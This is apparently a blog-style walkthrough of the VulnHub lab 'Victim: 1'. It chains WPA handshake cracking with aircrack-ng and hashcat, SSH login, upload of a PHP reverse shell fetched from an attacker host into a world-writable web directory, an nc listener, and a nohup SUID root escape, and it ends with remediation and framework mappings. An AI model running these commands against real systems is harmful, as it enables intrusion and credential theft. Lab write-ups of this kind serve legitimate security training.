# Victim: 1 — The WiFi Password Was on the Web Server the Whole Time

Look at guys!! Who would have thought a CTF machine would host the WiFi password capture file on its own public web server? Victim: 1 is a creative chain where you download a WPA handshake from WordPress, crack the WiFi key with aircrack-ng, SSH in with the SSID-as-username trick, find a world-writable web directory, upload a PHP reverse shell, and walk out as root because the web server decided it was fine to run as root. Goated design for teaching WiFi credential abuse in a realistic-ish context. Thanks to the creator.

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | Victim: 1 |
| **Attacker VM** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/victim-1,555/ |
| **Techniques** | WordPress enumeration, WPA handshake download, aircrack-ng WPA cracking, SSH login, world-writable web directory, PHP reverse shell upload, nohup SUID or root web server |
| **CVEs** | CWE-312 (WPA capture stored on public server), CWE-732 (world-writable web directory), CWE-434 (PHP file upload execution), CWE-269 (web server running as root) |
| **APT Groups** | APT41 — uses credential harvest from publicly exposed files for initial access; multiple ransomware operators use web server privilege abuse as a fast-path to root when the server process runs elevated |

---

## Attack Summary

```
nmap → SSH 22, HTTP 80, WordPress 8080, HTTP 9000
  → WordPress 8080: downloadable WPA-01.cap
  → Wireshark: SSID = "dlink"
  → aircrack-ng + rockyou.txt → KEY FOUND: p4ssword
  → ssh dlink@TARGET (password: p4ssword)
  → find / -writable -type d → /var/www/bolt/public/files (world-writable)
  → PHP reverse shell upload via wget to world-writable dir
  → browse to http://TARGET:8080/files/shell.php → nc callback
  → id: uid=0(root) (web server runs as root)
  → /root/flag.txt
```

---

## Methodology

1. Full port scan to enumerate all HTTP services
2. WordPress enumeration: discover WPA capture file
3. Wireshark: extract SSID from WPA capture as potential username
4. Crack WPA handshake with aircrack-ng and rockyou
5. SSH access with WiFi credentials (SSID as username, WPA key as password)
6. Enumerate world-writable directories on the filesystem
7. Upload PHP reverse shell to writable web directory
8. Trigger the shell via HTTP browser request
9. Root access: web server runs as root (or nohup SUID)

---

## Step 1 — Host Discovery and Port Scan

```bash
sudo netdiscover -i eth1 -r 192.168.1.0/24
# Target: 192.168.1.104

nmap -p- -A 192.168.1.104
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.x
80/tcp   open  http     Apache httpd
8080/tcp open  http     WordPress
9000/tcp open  http     (additional web service)
```

Multiple HTTP services on non-standard ports. WordPress on 8080 is the main attack surface. Port 9000 may run a CMS or web application worth enumerating.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 2 — WordPress Enumeration and WPA Capture Download

Browse to `http://192.168.1.104:8080`. The WordPress site hosts a downloadable file in the media library:

```bash
wget http://192.168.1.104:8080/wp-content/uploads/WPA-01.cap
```

Open the capture in Wireshark:

```bash
wireshark WPA-01.cap
# Or: tshark -r WPA-01.cap -Y "wlan.fc.type_subtype==0x08" -T fields -e wlan.ssid
```

The SSID embedded in the WPA handshake is **"dlink"**. In CTF convention (and occasionally in real environments), the device name or SSID doubles as a username. Note it for SSH.

**Real-world note:** Penetration testers regularly find .cap, .pcap, and .pcapng files left on web servers during assessments of SMBs. Developers sometimes upload network diagnostic captures that contain authentication handshakes. An attacker with aircrack-ng and a GPU can crack weak WPA2 passphrases from such captures in minutes.

**MITRE ATT&CK:** T1592.002 — Gather Victim Host Information: Software; T1039 — Data from Network Shared Drive

---

## Step 3 — Crack WPA Handshake with Aircrack-ng

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap
```

```
KEY FOUND! [ p4ssword ]
```

Aircrack-ng performs a dictionary attack on the 4-way handshake captured in the .cap file. WPA2 is computationally expensive to brute force, but dictionary attacks against weak passphrases are fast even on CPU. For stronger coverage, use `hashcat -m 22000` with GPU acceleration.

```bash
# Convert to hashcat format if needed:
hcxpcapngtool -o hash.hc22000 WPA-01.cap
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

**MITRE ATT&CK:** T1110.002 — Brute Force: Password Cracking

---

## Step 4 — SSH Login with WiFi Credentials

```bash
ssh dlink@192.168.1.104
# Password: p4ssword

id
# uid=1000(dlink) gid=1000(dlink)
ls /home
cat /etc/passwd | grep -v nologin
```

Enumerate the system from the `dlink` user context. Check home directories, sudo rights, and running processes.

**MITRE ATT&CK:** T1021.004 — Remote Services: SSH

---

## Step 5 — Enumerate World-Writable Directories

```bash
find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys
```

Output includes `/var/www/bolt/public/files`. Verify:

```bash
ls -la /var/www/bolt/public/files
# drwxrwxrwx (world-writable, owned by root)
```

This is a critical misconfiguration: the directory is owned by root but writable by any user. Any file placed here and served by the web server can be executed if the server handles PHP.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Credentials in Files

---

## Step 6 — PHP Reverse Shell Upload

Prepare the shell on the attacker machine:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/shell.php
# Edit: $ip = '192.168.1.ATTACKER'; $port = 4444;
python3 -m http.server 8000
```

On the target as `dlink`:

```bash
cd /var/www/bolt/public/files
wget http://192.168.1.ATTACKER:8000/shell.php
ls -la shell.php
```

Start the listener:

```bash
# Attacker:
nc -lvnp 4444
```

Trigger the reverse shell:

```bash
curl http://192.168.1.104:8080/files/shell.php
# Or browse to it in a browser
```

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application; T1059.004 — Command and Scripting Interpreter: Unix Shell

---

## Step 7 — Root Access

The reverse shell returns as `root` because the web server process runs as root:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. Nailed it.

**Alternative via nohup SUID** (if the web server does not run as root directly):

```bash
find / -perm -4000 -type f 2>/dev/null | grep nohup
nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
id
# uid=0(root)
```

The `-p` flag preserves the SUID UID, granting root privileges when the binary has SUID set.

**MITRE ATT&CK:** T1548.001 — Abuse Elevation Control Mechanism: Setuid and Setgid

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Notes |
|---|---|---|---|
| WiFi SSID | dlink | WPA-01.cap (Wireshark) | Used as SSH username |
| WPA key | p4ssword | aircrack-ng + rockyou | Used as SSH password |
| SSH credential | dlink:p4ssword | WPA capture crack | Initial access |
| Root flag | (varies per instance) | /root/flag.txt | After web server RCE |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | WPA capture file stored on public web server | Developers upload network diagnostic captures to web servers; attackers crack WPA2 handshakes from them | Never store .cap/.pcap files on web servers; purge them after diagnostics |
| 2 | SSID = username credential reuse | Device names and SSIDs frequently mirror usernames; attackers test this first | Never reuse device names, SSIDs, or hostnames as credentials |
| 3 | World-writable web directory allows PHP upload | Any user (or compromised process) can plant executable code in a world-writable web dir | Set `755` on web directories; `644` on files; disable PHP execution in upload directories |
| 4 | Web server running as root | If the web server process runs as root, any RCE immediately grants root; this eliminates the need for privilege escalation | Run web servers as `www-data` or a dedicated low-privilege user; use systemd sandboxing |
| 5 | Weak WPA2 passphrase crackable via dictionary | WPA2 handshakes captured over the air or found in .cap files are crackable offline; "p4ssword" is in rockyou | Use WPA3 or a random 20+ character passphrase; rotate WiFi passwords regularly |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Reconnaissance | Collection | Data from Network Shared Drive | T1039 |
| Credential Access | Credential Access | Password Cracking | T1110.002 |
| Initial Access | Initial Access | Valid Accounts | T1078 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Initial Access | Initial Access | Exploit Public-Facing Application | T1190 |
| Privilege Escalation | Privilege Escalation | Setuid and Setgid | T1548.001 |

---

## Remediation and Containment

### Technical Fixes

1. **Remove WPA capture from web server**: immediately delete WPA-01.cap and audit all file uploads for .cap/.pcap files
2. **Rotate WiFi credentials**: change WPA2 passphrase to a random 20+ character string; consider WPA3 migration
3. **Fix web directory permissions**: `chmod 755 /var/www/bolt/public/files`; add `.htaccess` or nginx config to deny PHP execution in upload directories
4. **Run web server as non-root**: configure Apache/Nginx to run as `www-data`; verify with `ps aux | grep apache`
5. **Disable PHP in upload directory**: add `php_flag engine off` in `.htaccess` or configure the web server to treat `/files/` as static-only
6. **Audit SSH credentials**: ensure no device-name/SSID-derived passwords exist; enforce SSH key authentication

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Audit all web-accessible files; identify .cap/.pcap files |
| Protect | Access Control | Fix web directory permissions; run web server as non-root |
| Protect | Data Security | Remove WPA captures from public-facing servers |
| Detect | Anomalies and Events | Monitor for unexpected PHP file creation in web directories |
| Respond | Response Planning | Rotate WiFi credentials; remove uploaded webshells |
| Recover | Recovery Planning | Patch web server configuration; audit all running service permissions |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Fix world-writable web directory; enforce least-access on all web paths |
| AC-6 | Least Privilege | Run web server as low-privilege user |
| CM-7 | Least Functionality | Disable PHP execution in upload directories |
| IA-5 | Authenticator Management | Rotate WiFi/SSH passwords; migrate to WPA3 |
| SC-28 | Protection of Information at Rest | Never store WPA captures or credential material on web servers |

### CISA KEV

The world-writable web directory combined with PHP execution maps to patterns described in CISA guidance on web shell deployment (AA21-008A). Running web servers as root is explicitly flagged in CISA's cloud and on-premise hardening guidance.

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL2 |
| Threat and Vulnerability Management (THREAT) | Manage Vulnerabilities | MIL2 |
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Application Configuration Hardening (web server non-root; PHP execution disabled in uploads)
- **D3-OAM** — Operating System Administrative Management (directory permission hardening)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credential material in web-accessible paths)

---

## Final Thoughts

Victim: 1 is a compact, well-designed machine that teaches an underappreciated attack path: extracting credentials from network captures found on web servers. In real engagements, this exact scenario appears: a developer uploads a diagnostic capture to a shared web folder, an attacker downloads it, cracks the WPA2 handshake, and pivots into the internal network with valid WiFi credentials.

The web-server-as-root finding is the cherry on top: a single PHP file upload grants root without any privilege escalation required. Both findings are "won't fix" in many small organizations because they are configuration issues, not CVEs, and therefore invisible to vulnerability scanners that only check for patched software versions.

Thanks guys!! (❍ᴥ❍ʋ)
